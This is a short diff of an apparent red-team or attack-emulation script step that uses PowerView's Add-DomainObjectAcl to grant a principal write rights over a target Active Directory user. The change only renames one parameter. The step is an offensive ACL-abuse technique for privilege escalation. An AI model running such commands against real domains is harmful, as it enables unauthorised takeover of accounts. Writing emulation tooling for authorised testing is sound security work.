@@ -24,7 +24,7 @@ if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
 $ErrorActionPreference = "Stop";
 $u = "'''"${DOMAIN_ROOT}\${PRINCIPAL}"'''";
 $t = "'''"${TARGET_USER}"'''";
-Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights WriteProperty -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
+Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights WriteProperty -Server "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
 Write-Output "T014_OK: granted GenericWrite to $u on $t"
 '
 
